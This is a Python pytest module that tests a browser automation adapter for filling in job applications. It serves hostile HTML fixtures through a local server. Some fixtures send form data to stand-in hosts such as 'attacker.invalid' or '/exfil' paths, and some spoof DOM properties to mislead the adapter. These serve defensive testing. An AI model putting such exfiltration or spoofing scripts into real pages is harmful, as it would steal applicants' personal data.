from __future__ import annotations

import base64
import http.server
import hashlib
import json
import os
import signal
import selectors
import socket
import struct
import socketserver
import subprocess
import sys
import threading
import time
from pathlib import Path

import pytest

from jobs_assistant.browser_adapter import (
    BrowserAdapterError,
    PuppeteerSession,
    _read_one_frame,
    _capture_process_identity,
    normalize_browser_error_code,
    validate_ats_url,
    validate_greenhouse_url,
)




FIXTURE = Path(__file__).with_name("fixtures") / "puppeteer_adapter" / "greenhouse_guarded.html"
LEVER_FIXTURE = Path(__file__).with_name("fixtures") / "puppeteer_adapter" / "lever_guarded.html"
CLEAN_FIXTURE = b"""<!doctype html>
<html><head><title>Greenhouse Clean Fixture</title></head>
<body><form>
<label>First Name <input name="first_name" autocomplete="given-name" required></label>
<label>Resume <input name="resume" type="file" accept="application/pdf,.pdf"></label>
<button type="button" id="offline">Continue</button>
<a id="human-review-link" href="?gh_src=human-review">Continue to guarded local review</a>
<button type="submit" id="submit-final">Submit Application</button>
</form>
<script>window.addEventListener("input",()=>{fetch("/exfil-after-input").catch(()=>{});const image=new Image();image.src="http://attacker.invalid/leak"});</script>
</body></html>"""
CITIZENSHIP_STATUS_FIXTURE = b"""<!doctype html>
<html><head><title>Citizenship Status Fixture</title></head>
<body><form>
<label for="first-name">First Name</label><input id="first-name" name="first_name" autocomplete="given-name" required>
<label for="citizenship-status">Citizenship Status*</label><input id="citizenship-status" name="citizenshipStatus" required>
<label for="usCitizen">Are you a U.S. citizen?</label><input id="usCitizen" name="usCitizen" required>
<button type="submit" id="submit-final">Submit Application</button>
</form></body></html>"""

def _field_cap_fixture(count: int) -> bytes:
    fields = "".join(f'<label>Field {index}<input name="field_{index}"></label>' for index in range(count))
    return f'<!doctype html><html><body><form>{fields}<button type="submit" id="submit-final">Submit Application</button></form></body></html>'.encode()


def _button_cap_fixture(count: int) -> bytes:
    buttons = "".join(f'<button type="button" id="offline-{index}">Continue {index}</button>' for index in range(count))
    return f'<!doctype html><html><body>{buttons}<button type="submit" id="submit-final">Submit Application</button></body></html>'.encode()


FIELD_CAP_BOUNDARY_FIXTURE = _field_cap_fixture(1000)
FIELD_CAP_OVERFLOW_FIXTURE = _field_cap_fixture(1001)
BUTTON_CAP_BOUNDARY_FIXTURE = _button_cap_fixture(399)
BUTTON_CAP_OVERFLOW_FIXTURE = _button_cap_fixture(400)
ARIA_HIDDEN_FIXTURE = b"""<!doctype html>
<html><head><title>Aria Hidden Fixture</title></head>
<body><form>
<div aria-hidden="  TrUe  "><label>Hidden Field <input id="hidden-field" name="hidden_field" required></label></div>
<div><section aria-hidden=" TRUE "><button type="button" id="hidden-button">Continue</button></section></div>
<label>Visible Field <input id="visible-field" name="visible_field" required></label>
<button type="submit" id="submit-final">Submit Application</button>
<script>
const hiddenField = document.getElementById("hidden-field");
hiddenField.getAttribute = name => name === "aria-hidden"
    ? "false" : Element.prototype.getAttribute.call(hiddenField, name);
const hiddenSection = document.querySelector("section");
hiddenSection.getAttribute = name => name === "aria-hidden"
    ? "false" : Element.prototype.getAttribute.call(hiddenSection, name);
</script></form></body></html>"""
SUBMIT_CONTINUATION_FIXTURE = b"""<!doctype html>
<html><head><title>Greenhouse Submit Continuation Fixture</title></head>
<body>
<button type="submit" id="continue-native">Continue</button>
<button type="submit" id="submit-final">Submit Application</button>
<script>document.getElementById("continue-native").addEventListener("click",()=>{history.pushState({}, "", "/fixture/jobs/123?gh_src=step-2");document.body.dataset.continued="yes"});</script>
</body></html>"""
ANCHOR_CONTINUATION_FIXTURE = b"""<!doctype html>
<html><head><title>Greenhouse Anchor Continuation Fixture</title></head>
<body>
<a id="continue-anchor" href="/fixture/jobs/123?gh_src=step-2">Next</a>
<button type="submit" id="submit-final">Submit Application</button>
</body></html>"""
STATIC_ASSET_CONTINUATION_FIXTURE = ANCHOR_CONTINUATION_FIXTURE.replace(
    b"</body>",
    b'<script>if(location.search==="?gh_src=step-2")setTimeout(()=>{const image=new Image();image.src="https://job-boards.cdn.greenhouse.io/assets/continuation-pixel"},200);</script></body>',
)
OLD_PAGE_STATIC_CONTINUATION_FIXTURE = ANCHOR_CONTINUATION_FIXTURE.replace(
    b"</body>",
    b"""<script>
const anchor = document.getElementById("continue-anchor");
anchor.addEventListener("click", event => {
  event.preventDefault();
  history.pushState({}, "", "/fixture/jobs/123?gh_src=step-2");
  const marker = document.createElement("button");
  marker.type = "button";
  marker.id = "old-page-listener-marker";
  marker.textContent = "OLD_PAGE_LISTENER_RAN";
  document.body.append(marker);
  const image = new Image();
  image.src = "https://job-boards.cdn.greenhouse.io/assets/pixel/payload-encoded-7f4c";
});
</script></body>""",
)
OLD_PAGE_WEBSOCKET_CONTINUATION_FIXTURE = ANCHOR_CONTINUATION_FIXTURE.replace(
    b"</body>",
    b"""<script>
const anchor = document.getElementById("continue-anchor");
anchor.addEventListener("click", event => {
  event.preventDefault();
  history.pushState({}, "", "/fixture/jobs/123?gh_src=step-2");
  const marker = document.createElement("button");
  marker.type = "button";
  marker.id = "old-page-listener-marker";
  marker.textContent = "OLD_PAGE_LISTENER_RAN";
  document.body.append(marker);
  try { new WebSocket("wss://job-boards.cdn.greenhouse.io/assets/stream"); } catch {}
});
</script></body>""",
)
ANCHOR_EMPTY_TARGET_FIXTURE = ANCHOR_CONTINUATION_FIXTURE.replace(
    b' id="continue-anchor" href="/fixture/jobs/123?gh_src=step-2"',
    b' id="continue-anchor" target="" href="/fixture/jobs/123?gh_src=step-2"',
)
ANCHOR_DOWNLOAD_FIXTURE = ANCHOR_CONTINUATION_FIXTURE.replace(
    b' id="continue-anchor" href="/fixture/jobs/123?gh_src=step-2"',
    b' id="continue-anchor" download href="/fixture/jobs/123?gh_src=step-2"',
)
ANCHOR_DRIFT_FIXTURE = ANCHOR_CONTINUATION_FIXTURE.replace(
    b"</body>",
    b'<script>setTimeout(()=>document.getElementById("continue-anchor").setAttribute("href","/fixture/jobs/123?gh_src=drift"),3000);</script></body>',
)
ANCHOR_PAGEHIDE_STATIC_URL = "https://job-boards.cdn.greenhouse.io/assets/pixel/precommit-static"
OLD_PAGE_PAGEHIDE_STATIC_CONTINUATION_FIXTURE = ANCHOR_CONTINUATION_FIXTURE.replace(
    b"</body>",
    (
        f"""<img id="initial-static" src="{ANCHOR_PAGEHIDE_STATIC_URL}">
<script>
window.addEventListener("pagehide", () => {{
  const image = new Image();
  document.body.append(image);
  image.loading = "eager";
  image.src = "{ANCHOR_PAGEHIDE_STATIC_URL}";
}});
</script></body>"""
    ).encode(),
)
NATIVE_PROGRESS_SEMANTICS_FIXTURE = b"""<!doctype html>
<html><head><title>Native Progress Semantics Fixture</title></head>
<body>
<button type="button" id="continue-button">Continue</button>
<button type="button" id="next-button">Next</button>
<button type="button" id="next-google-button" aria-label="Continue with Google">Next</button>
<input type="button" id="next-input" value="Next">
<button type="button" id="continue-via-google-button">Continue via Google</button>
<button type="button" id="continue-using-example-button">Continue using ExampleID</button>
<button type="button" id="next-with-google-button">Next with Google</button>
<button type="submit" id="continue-detached">Continue</button>
<button type="button" id="apply-button">Apply</button>
<button type="button" id="create-alert-button">Create alert</button>
<button type="button" id="quick-apply-button">Quick Apply with MyGreenhouse</button>
<button type="button" id="continue-with-account-button">Continue with MyGreenhouse</button>
<button type="submit" id="apply-submit">Apply</button>
<button type="submit" id="submit-final">Submit Application</button>
</body></html>"""
DISABLED_FIELDSET_FIXTURE = b"""<!doctype html>
<html><head><title>Disabled Controls Fixture</title></head>
<body>
<fieldset disabled>
  <button type="button" id="disabled-continue">Continue</button>
</fieldset>
<button type="button" id="aria-disabled-continue" aria-disabled="true">Next</button>
<div aria-disabled="true">
  <button type="button" id="aria-disabled-ancestor-continue">Proceed</button>
</div>
<button type="button" id="aria-disabled-drift-continue">Continue</button>
<input type="text" id="aria-disabled-drift-field" name="aria_drift_field">
<input type="file" id="aria-disabled-drift-upload" name="resume" accept=".pdf">
<input type="checkbox" id="aria-disabled-drift-check" name="aria_drift_check">
<select id="aria-disabled-drift-select" name="aria_drift_select">
  <option value="">Choose</option><option value="us">United States</option>
</select>
<select id="aria-disabled-drift-multi" name="aria_drift_multi" multiple>
  <option value="go">Go</option><option value="rust">Rust</option>
</select>
<script>
for (const id of [
  "disabled-continue",
  "aria-disabled-continue",
  "aria-disabled-ancestor-continue",
  "aria-disabled-drift-continue",
  "aria-disabled-drift-field",
  "aria-disabled-drift-upload",
  "aria-disabled-drift-check",
  "aria-disabled-drift-select",
  "aria-disabled-drift-multi",
]) {
  const eventName = [
    "aria-disabled-drift-field",
    "aria-disabled-drift-upload",
    "aria-disabled-drift-check",
    "aria-disabled-drift-select",
    "aria-disabled-drift-multi",
  ].includes(id) ? "input" : "click";
  document.getElementById(id).addEventListener(eventName, () => {
    const marker = document.createElement("button");
    marker.type = "button";
    marker.id = `${id}-listener-marker`;
    marker.textContent = "Next";
    document.body.append(marker);
  });
}
</script>
</body></html>"""
STATIC_CAP_CONTINUATION_FIXTURE = (
    b"<!doctype html><html><head><title>Static Cap Fixture</title>"
    + b"".join(
        f'<link rel="stylesheet" href="https://job-boards.cdn.greenhouse.io/assets/cap-{index}.css">'
        .encode()
        for index in range(200)
    )
    + b"""</head><body>
<a id="continue-anchor" href="/fixture/jobs/123?gh_src=step-2">Next</a>
<button type="submit" id="submit-final">Submit Application</button>
</body></html>"""
)
NATIVE_AUTH_BLOCKER_FIXTURE = b"""<!doctype html>
<html><head><title>Native Auth Blocker Fixture</title></head>
<body>
<button type="button" id="sign-in-button">Sign in</button>
<button type="button" id="create-account-button">Create account</button>
<button type="button" id="log-in-button">Log in</button>
</body></html>"""
NATIVE_PROGRESS_DRIFT_FIXTURE = b"""<!doctype html>
<html><head><title>Native Progress Drift Fixture</title></head>
<body>
<button type="button" id="drift-button">Continue</button>
<script>
const driftButton = document.getElementById("drift-button");
driftButton.addEventListener("click", event => {
  event.preventDefault();
  const marker = document.createElement("button");
  marker.type = "button";
  marker.id = "drift-listener-marker";
  marker.textContent = "DRIFT_LISTENER_RAN";
  document.body.append(marker);
  fetch("/exfil-drift-listener").catch(() => {});
});
</script>
</body></html>"""
CROSS_JOB_CONTINUATION_FIXTURE = SUBMIT_CONTINUATION_FIXTURE.replace(
    b"/fixture/jobs/123?gh_src=step-2",
    b"/other/jobs/999",
)
FINAL_LIKE_CONTINUATION_FIXTURE = SUBMIT_CONTINUATION_FIXTURE.replace(
    b"/fixture/jobs/123?gh_src=step-2",
    b"/fixture/jobs/123?gh_src=submit",
)
SCRIPT_FAVICON_CONTINUATION_FIXTURE = SUBMIT_CONTINUATION_FIXTURE.replace(
    b'history.pushState({}, "", "/fixture/jobs/123?gh_src=step-2");document.body.dataset.continued="yes"',
    b'fetch("/favicon.ico").catch(()=>{})',
)
SCRIPT_CROSS_ORIGIN_CONTINUATION_FIXTURE = SUBMIT_CONTINUATION_FIXTURE.replace(
    b'history.pushState({}, "", "/fixture/jobs/123?gh_src=step-2");document.body.dataset.continued="yes"',
    b'fetch("https://www.google.com/jobs-assistant-probe").catch(()=>{})',
)
SCRIPT_WEBSOCKET_CONTINUATION_FIXTURE = SUBMIT_CONTINUATION_FIXTURE.replace(
    b'history.pushState({}, "", "/fixture/jobs/123?gh_src=step-2");document.body.dataset.continued="yes"',
    b'new WebSocket("wss://www.google.com/jobs-assistant-probe")',
)
SCRIPT_POPUP_CONTINUATION_FIXTURE = SUBMIT_CONTINUATION_FIXTURE.replace(
    b'history.pushState({}, "", "/fixture/jobs/123?gh_src=step-2");document.body.dataset.continued="yes"',
    b'window.open("https://www.google.com/jobs-assistant-probe")',
)
BLOCKER_FIXTURE = b"""<!doctype html><form>
<label>First Name <input name="first_name" required></label>
<button type="button" id="offline">Continue</button>
<div id="blocker">CAPTCHA authentication assessment required</div>
</form>"""
INPUT_BUTTON_FIXTURE = b"""<!doctype html>
<html><head><title>Input Button Fixture</title></head>
<body><form>
<label>First Name <input name="first_name" autocomplete="given-name" required></label>
<input type="button" id="input-offline" value="Continue">
<button type="submit" id="submit-final">Submit Application</button>
</form>
<script>document.getElementById("input-offline").addEventListener("click",()=>{const revealed=document.createElement("input");revealed.name="revealed_step";document.body.append(revealed)});</script>
</body></html>"""
INPUT_BUTTON_NETWORK_FIXTURE = b"""<!doctype html>
<html><head><title>Input Button Network Fixture</title></head>
<body><form>
<input type="button" id="input-network" value="Continue">
<button type="submit" id="submit-final">Submit Application</button>
</form>
<script>
document.getElementById("input-network").addEventListener("click",()=>{fetch("https://attacker.invalid/exfil").catch(()=>{})});
</script>
</body></html>"""
INPUT_BUTTON_FINAL_LIKE_FIXTURE = b"""<!doctype html>
<html><head><title>Input Button Final Like Fixture</title></head>
<body><form>
<input type="button" id="input-final" value="Submit Application">
<button type="submit" id="submit-final">Submit Application</button>
</form>
<script>
const finalInput = document.getElementById("input-final");
Object.defineProperty(finalInput, "value", {
  configurable: true,
  get() { return "Continue"; },
});
finalInput.addEventListener("click",()=>{document.body.dataset.clicked="yes"});
</script>
</body></html>"""

SINGLE_SELECT_EMPTY_PLACEHOLDER_FIXTURE = b"""<!doctype html>
<html><head><title>Single Select Empty Placeholder Fixture</title></head>
<body><form>
<label>Country <select name="country" required>
<option value="" disabled selected>Choose a country</option>
<option value="us">United States</option>
<option value="ca">Canada</option>
</select></label>
<button type="submit" id="submit-final">Submit Application</button>
</form></body></html>"""

MULTI_SELECT_FIXTURE = b"""<!doctype html>
<html><head><title>Multi Select Fixture</title></head>
<body><form>
<label>Skills <select name="skills" multiple required>
<option value="go">Go</option>
<option value="rust">Rust</option>
<option value="python">Python</option>
<option value="js">JavaScript</option>
</select></label>
<button type="submit" id="submit-final">Submit Application</button>
</form></body></html>"""

MULTI_SELECT_DISABLED_FIXTURE = b"""<!doctype html>
<html><head><title>Multi Select Disabled Fixture</title></head>
<body><form>
<label>Skills <select name="skills" multiple required>
<option value="go">Go</option>
<option value="rust" disabled>Rust</option>
<optgroup label="legacy" disabled><option value="cobol">Cobol</option></optgroup>
</select></label>
<button type="submit" id="submit-final">Submit Application</button>
</form></body></html>"""

MULTI_SELECT_DUPLICATE_FIXTURE = b"""<!doctype html>
<html><head><title>Multi Select Duplicate Fixture</title></head>
<body><form>
<label>Skills <select name="skills" multiple required>
<option value="go">Go</option>
<option value="go">Go duplicate</option>
<option value="rust">Rust</option>
</select></label>
<button type="submit" id="submit-final">Submit Application</button>
</form></body></html>"""

MULTI_SELECT_MASKED_FIXTURE = b"""<!doctype html>
<html><head><title>Multi Select Masked Fixture</title></head>
<body><form>
<label>Skills <select name="skills" multiple required>
<option value="go">Go</option>
<option value="rust">Rust</option>
<option value="python">Python</option>
</select></label>
<button type="submit" id="submit-final">Submit Application</button>
</form>
<script>
const s = document.querySelector('select');
const realOptions = s.options;
Object.defineProperty(s, 'multiple', { configurable: true, get() { return false; } });
Object.defineProperty(s, 'options', { configurable: true, get() { return [realOptions[2], realOptions[0], realOptions[1]]; } });
Object.defineProperty(s, 'value', { configurable: true, get() { return ['masked']; } });
const opts = realOptions;
Object.defineProperty(opts[0], 'value', { configurable: true, get() { return 'masked'; } });
Object.defineProperty(opts[0], 'selected', { configurable: true, get() { return true; } });
</script></body></html>"""

MULTI_SELECT_OPTION_LABEL_SPOOF_FIXTURE = b"""<!doctype html>
<html><head><title>Multi Select Option Label Spoof Fixture</title></head>
<body><form>
<label>Skills <select name="skills" multiple required>
<option value="go">Go</option>
<option value="rust">Rust</option>
<option value="python">Python</option>
</select></label>
<button type="submit" id="submit-final">Submit Application</button>
</form>
<script>
const s = document.querySelector('select');
const option = s.options[0];
Object.defineProperty(option, 'label', { configurable: true, get() { return 'Rust'; } });
Object.defineProperty(option, 'text', { configurable: true, get() { return 'Python'; } });
</script></body></html>"""

MULTI_SELECT_HOSTILE_FIXTURE = b"""<!doctype html>
<html><head><title>Multi Select Hostile Fixture</title></head>
<body><form>
<label>Skills <select name="skills" multiple required>
<option value="go">Go</option>
<option value="rust">Rust</option>
<option value="python">Python</option>
</select></label>
<button type="submit" id="submit-final">Submit Application</button>
</form>
<script>
const s = document.querySelector('select');
function exfil() { s.options[0].label = 'Drifted'; fetch('https://attacker.invalid/exfil').catch(()=>{}); }
s.addEventListener('input', exfil);
s.addEventListener('change', exfil);
</script></body></html>"""

MULTI_SELECT_POST_EVENT_DRIFT_FIXTURE = b"""<!doctype html>
<html><head><title>Multi Select Post Event Drift Fixture</title></head>
<body><form>
<label>Skills <select name="skills" multiple required>
<option value="go">Go</option>
<option value="rust">Rust</option>
<option value="python">Python</option>
</select></label>
<button type="submit" id="submit-final">Submit Application</button>
</form>
<script>
const s = document.querySelector('select');
s.addEventListener('change', () => {
  const duplicate = document.createElement('option');
  duplicate.value = 'go';
  duplicate.textContent = 'Go duplicate';
  s.append(duplicate);
});
</script></body></html>"""
MULTI_SELECT_DISABLED_DUPLICATE_FIXTURE = b"""<!doctype html>
<html><head><title>Multi Select Disabled Duplicate Fixture</title></head>
<body><form>
<label>Skills <select name="skills" multiple required>
<option value="go" disabled>Go disabled</option>
<option value="go">Go enabled</option>
<option value="rust">Rust</option>
</select></label>
<button type="submit" id="submit-final">Submit Application</button>
</form></body></html>"""

MULTI_SELECT_MULTIPLE_SPOOF_FIXTURE = b"""<!doctype html>
<html><head><title>Multi Select Multiple Spoof Fixture</title></head>
<body><form>
<label>Skills <select name="skills" multiple required>
<option value="go">Go</option>
<option value="rust">Rust</option>
<option value="python">Python</option>
</select></label>
<button type="submit" id="submit-final">Submit Application</button>
</form>
<script>
const s = document.querySelector('select');
Object.defineProperty(s, 'multiple', { configurable: true, get() { return false; } });
</script></body></html>"""

MULTI_SELECT_OPTIONS_SPOOF_FIXTURE = b"""<!doctype html>
<html><head><title>Multi Select Options Spoof Fixture</title></head>
<body><form>
<label>Skills <select name="skills" multiple required>
<option value="go">Go</option>
<option value="rust">Rust</option>
<option value="python">Python</option>
</select></label>
<button type="submit" id="submit-final">Submit Application</button>
</form>
<script>
const s = document.querySelector('select');
const real = s.options;
const fake = [real[2], real[0], real[1]];
Object.defineProperty(s, 'options', { configurable: true, get() { return fake; } });
</script></body></html>"""

MULTI_SELECT_PRESELECTED_DISABLED_FIXTURE = b"""<!doctype html>
<html><head><title>Multi Select Preselected Disabled Fixture</title></head>
<body><form>
<label>Skills <select name="skills" multiple required>
<option value="cobol" disabled selected>Cobol disabled</option>
<option value="go">Go enabled</option>
<option value="rust">Rust</option>
</select></label>
<button type="submit" id="submit-final">Submit Application</button>
</form></body></html>"""

MULTI_SELECT_DISABLED_OPTGROUP_SPOOF_FIXTURE = b"""<!doctype html>
<html><head><title>Multi Select Disabled Optgroup Spoof Fixture</title></head>
<body><form>
<label>Skills <select name="skills" multiple required>
<option value="go">Go</option>
<optgroup label="legacy" disabled><option value="cobol">Cobol</option></optgroup>
</select></label>
<button type="submit" id="submit-final">Submit Application</button>
</form>
<script>
const s = document.querySelector('select');
const group = s.querySelector('optgroup');
const option = group.querySelector('option');
Object.defineProperty(option, 'parentElement', { configurable: true, get() { return s; } });
Object.defineProperty(group, 'localName', { configurable: true, get() { return 'select'; } });
Object.defineProperty(group, 'tagName', { configurable: true, get() { return 'SELECT'; } });
</script></body></html>"""

MULTI_SELECT_TOCTOU_TIMER_FIXTURE = b"""<!doctype html>
<html><head><title>Multi Select TOCTOU Timer Fixture</title></head>
<body><form>
<label>Skills <select name="skills" multiple required>
<option value="go">Go</option>
<option value="rust">Rust</option>
<option value="python">Python</option>
</select></label>
<button type="submit" id="submit-final">Submit Application</button>
</form></body></html>"""

class FixtureHandler(http.server.SimpleHTTPRequestHandler):
    attacker_http_requests = 0
    final_like_requests = 0
    fixture_requests = 0
    benign_requests = 0
    static_requests = 0
    logical_urls: list[str] = []

    def do_GET(self):  # noqa: N802
        type(self).fixture_requests += 1
        if self.path.startswith("/assets/"):
            type(self).static_requests += 1
        encoded_logical = self.headers.get("x-jobs-assistant-logical-url")
        if encoded_logical:
            try:
                padding = "=" * (-len(encoded_logical) % 4)
                logical_url = base64.urlsafe_b64decode(encoded_logical + padding).decode("utf-8")
            except (ValueError, UnicodeDecodeError):
                logical_url = ""
            type(self).logical_urls.append(logical_url)
            if logical_url.startswith("https://job-boards.cdn.greenhouse.io/assets/"):
                type(self).static_requests += 1
        if self.path.startswith("/redirect-cross"):
            self.send_response(302)
            self.send_header("Location", "https://boards.greenhouse.io/other/jobs/999")
            self.end_headers()
            return
        if self.path.startswith("/redirect-loop"):
            self.send_response(302)
            self.send_header("Location", "https://boards.greenhouse.io/fixture/jobs/123")
            self.end_headers()
            return
        if self.path.startswith("/overflow-chunked") or self.path.startswith("/overflow-lying"):
            self.protocol_version = "HTTP/1.1"
            self.send_response(200)
            self.send_header("content-type", "text/html")
            if self.path.startswith("/overflow-chunked"):
                self.send_header("transfer-encoding", "chunked")
            else:
                self.send_header("content-length", "1")
            self.end_headers()
            remaining = 20 * 1024 * 1024 + 1
            chunk = b"x" * (64 * 1024)
            while remaining:
                piece = chunk[: min(len(chunk), remaining)]
                if self.path.startswith("/overflow-chunked"):
                    self.wfile.write(f"{len(piece):x}\r\n".encode() + piece + b"\r\n")
                else:
                    self.wfile.write(piece)
                remaining -= len(piece)
            if self.path.startswith("/overflow-chunked"):
                self.wfile.write(b"0\r\n\r\n")
            return
        if self.path.startswith("/captcha") or self.path.startswith("/auth") or self.path.startswith("/assessment") or self.path.startswith("/validation"):
            self.send_response(200)
            self.send_header("content-type", "text/html")
            self.end_headers()
            text = {
                "/captcha": "CAPTCHA required",
                "/auth": "Authentication required",
                "/assessment": "Assessment required",
                "/validation": "Please correct this field",
            }.get(self.path.split("?", 1)[0], "CAPTCHA required")
            body = (b'<!doctype html><form><input name="first_name"><div role="alert">Please correct this field</div></form>'
                    if self.path.startswith("/validation")
                    else BLOCKER_FIXTURE.replace(b"CAPTCHA authentication assessment required", text.encode()))
            self.wfile.write(body)
            return
        if "attacker" in self.path or "exfil" in self.path:
            type(self).attacker_http_requests += 1
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"attacker fixture path reached")
            return
        if any(token in self.path for token in ("submit", "complete", "confirm", "finish")):
            type(self).final_like_requests += 1
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"final fixture path reached")
            return
        type(self).benign_requests += 1
        self.send_response(200)
        self.send_header("content-type", "text/html")
        if type(self).logical_urls and type(self).logical_urls[-1].startswith("https://job-boards.cdn.greenhouse.io/assets/"):
            self.send_header("cache-control", "no-store")
        self.end_headers()
        logical = type(self).logical_urls[-1] if type(self).logical_urls else ""
        body = (
            LEVER_FIXTURE.read_bytes()
            if logical.startswith("https://jobs.lever.co/")
            else SCRIPT_FAVICON_CONTINUATION_FIXTURE if self.path.startswith("/continue-native-favicon-script")
            else SCRIPT_CROSS_ORIGIN_CONTINUATION_FIXTURE if self.path.startswith("/continue-native-cross-origin-script")
            else SCRIPT_WEBSOCKET_CONTINUATION_FIXTURE if self.path.startswith("/continue-native-websocket-script")
            else SCRIPT_POPUP_CONTINUATION_FIXTURE if self.path.startswith("/continue-native-popup-script")
            else OLD_PAGE_PAGEHIDE_STATIC_CONTINUATION_FIXTURE if self.path.startswith("/continue-anchor-pagehide-static")
            else STATIC_CAP_CONTINUATION_FIXTURE if self.path.startswith("/continue-anchor-static-cap")
            else STATIC_ASSET_CONTINUATION_FIXTURE if self.path.startswith("/continue-anchor-static")
            else OLD_PAGE_WEBSOCKET_CONTINUATION_FIXTURE if self.path.startswith("/continue-anchor-old-websocket")
            else OLD_PAGE_STATIC_CONTINUATION_FIXTURE if self.path.startswith("/continue-anchor-old-static")
            else ANCHOR_EMPTY_TARGET_FIXTURE if self.path.startswith("/continue-anchor-empty")
            else ANCHOR_DOWNLOAD_FIXTURE if self.path.startswith("/continue-anchor-download")
            else ANCHOR_DRIFT_FIXTURE if self.path.startswith("/continue-anchor-drift")
            else NATIVE_AUTH_BLOCKER_FIXTURE if self.path.startswith("/continue-native-auth-blocker")
            else NATIVE_PROGRESS_DRIFT_FIXTURE if self.path.startswith("/continue-native-progress-drift")
            else DISABLED_FIELDSET_FIXTURE if self.path.startswith("/continue-native-disabled-fieldset")
            else NATIVE_PROGRESS_SEMANTICS_FIXTURE if self.path.startswith("/continue-native-progress")
            else ANCHOR_CONTINUATION_FIXTURE if self.path.startswith("/continue-anchor")
            else CROSS_JOB_CONTINUATION_FIXTURE if self.path.startswith("/continue-native-cross-job")
            else FINAL_LIKE_CONTINUATION_FIXTURE if self.path.startswith("/continue-native-final")
            else SUBMIT_CONTINUATION_FIXTURE if self.path.startswith("/continue-native")
            else INPUT_BUTTON_FINAL_LIKE_FIXTURE if self.path.startswith("/input-button-final")
            else INPUT_BUTTON_NETWORK_FIXTURE if self.path.startswith("/input-button-network")
            else INPUT_BUTTON_FIXTURE if self.path.startswith("/input-button")
            else SINGLE_SELECT_EMPTY_PLACEHOLDER_FIXTURE if self.path.startswith("/single-select-empty-placeholder")
            else MULTI_SELECT_PRESELECTED_DISABLED_FIXTURE if self.path.startswith("/multi-select-preselected-disabled")
            else MULTI_SELECT_DISABLED_OPTGROUP_SPOOF_FIXTURE if self.path.startswith("/multi-select-disabled-optgroup-spoof")
            else MULTI_SELECT_TOCTOU_TIMER_FIXTURE if self.path.startswith("/multi-select-toctou-timer")
            else MULTI_SELECT_OPTIONS_SPOOF_FIXTURE if self.path.startswith("/multi-select-options-spoof")
            else MULTI_SELECT_OPTION_LABEL_SPOOF_FIXTURE if self.path.startswith("/multi-select-option-label-spoof")
            else MULTI_SELECT_MULTIPLE_SPOOF_FIXTURE if self.path.startswith("/multi-select-multiple-spoof")
            else MULTI_SELECT_POST_EVENT_DRIFT_FIXTURE if self.path.startswith("/multi-select-post-event-drift")
            else MULTI_SELECT_HOSTILE_FIXTURE if self.path.startswith("/multi-select-hostile")
            else MULTI_SELECT_DISABLED_DUPLICATE_FIXTURE if self.path.startswith("/multi-select-disabled-duplicate")
            else MULTI_SELECT_DUPLICATE_FIXTURE if self.path.startswith("/multi-select-duplicate")
            else MULTI_SELECT_MASKED_FIXTURE if self.path.startswith("/multi-select-masked")
            else MULTI_SELECT_DISABLED_FIXTURE if self.path.startswith("/multi-select-disabled")
            else MULTI_SELECT_FIXTURE if self.path.startswith("/multi-select")
            else FIELD_CAP_BOUNDARY_FIXTURE if self.path.startswith("/field-cap-boundary")
            else FIELD_CAP_OVERFLOW_FIXTURE if self.path.startswith("/field-cap-overflow")
            else BUTTON_CAP_BOUNDARY_FIXTURE if self.path.startswith("/button-cap-boundary")
            else BUTTON_CAP_OVERFLOW_FIXTURE if self.path.startswith("/button-cap-overflow")
            else ARIA_HIDDEN_FIXTURE if self.path.startswith("/aria-hidden")
            else CITIZENSHIP_STATUS_FIXTURE if self.path.startswith("/citizenship-status")
            else CLEAN_FIXTURE if self.path.startswith("/clean") else FIXTURE.read_bytes()
        )
        self.wfile.write(body)

    def log_message(self, format, *args):  # noqa: A002
        return

@pytest.fixture()
def fixture_server():
    FixtureHandler.attacker_http_requests = 0
    FixtureHandler.final_like_requests = 0
    FixtureHandler.fixture_requests = 0
    FixtureHandler.benign_requests = 0
    FixtureHandler.static_requests = 0
    FixtureHandler.logical_urls = []
    with socketserver.TCPServer(("127.0.0.1", 0), FixtureHandler) as server:
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        try:
            yield f"http://127.0.0.1:{server.server_address[1]}/clean"
        finally:
            server.shutdown()
            thread.join(timeout=5)


def field_by_name(observation: dict, name: str) -> dict:
    return next(field for field in observation["fields"] if field.get("name") == name)

def _validated_emergency_cleanup(identities: dict, manifest: Path) -> bool:
    """Kill only verified released owner and browser process groups."""
    def matches(identity: dict) -> bool:
        try:
            return _capture_process_identity(identity["pid"]) == identity
        except BrowserAdapterError:
            return False

    def group_exists(pgid: int) -> bool:
        try:
            os.killpg(pgid, 0)
            return True
        except ProcessLookupError:
            return False

    def groups_absent(groups: set[int], *, timeout: float = 5.0) -> bool:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            if all(not group_exists(pgid) for pgid in groups):
                return True
            time.sleep(0.05)
        return all(not group_exists(pgid) for pgid in groups)


    try:
        current = json.loads(manifest.read_text(encoding="utf-8"))
        owner = identities["owner"]
        browser = identities["browser"]
        fields = {"pid", "pgid", "birth"}
        for identity in (owner, browser):
            if not isinstance(identity, dict) or set(identity) != fields:
                return False
            if type(identity["pid"]) is not int or identity["pid"] <= 0:
                return False
            if type(identity["pgid"]) is not int or identity["pgid"] <= 0:
                return False
            if identity["pid"] != identity["pgid"]:
                return False
            if type(identity["birth"]) is not str or not identity["birth"] or len(identity["birth"]) > 256:
                return False
        if current.get("owner_identity") != owner or current.get("browser_identity") != browser:
            return False
        current_pid = os.getpid()
        current_pgid = os.getpgrp()
        if any(identity["pid"] == current_pid or identity["pgid"] == current_pgid for identity in (owner, browser)):
            return False
        groups = {browser["pgid"], owner["pgid"]}
        if current.get("state") == "closed":
            return current.get("cleanup") is True and groups_absent(groups)
        if current.get("state") != "open_guarded":
            return False
        identity_matches = {
            identity["pgid"]: matches(identity)
            for identity in (owner, browser)
        }
        verified_groups = {
            pgid
            for pgid, verified in identity_matches.items()
            if verified
        }
        unverified_group_present = any(
            not verified and group_exists(pgid)
            for pgid, verified in identity_matches.items()
        )
        for pgid in verified_groups:
            try:
                os.killpg(pgid, signal.SIGTERM)
            except ProcessLookupError:
                pass
        time.sleep(0.25)
        for pgid in verified_groups:
            if group_exists(pgid):
                try:
                    os.killpg(pgid, signal.SIGKILL)
                except ProcessLookupError:
                    pass
        return groups_absent(groups) and not unverified_group_present
    except (KeyError, TypeError, ValueError, OSError, AttributeError, json.JSONDecodeError):
        return False

BROWSER_INTEGRATION_SKIP = pytest.mark.skipif(
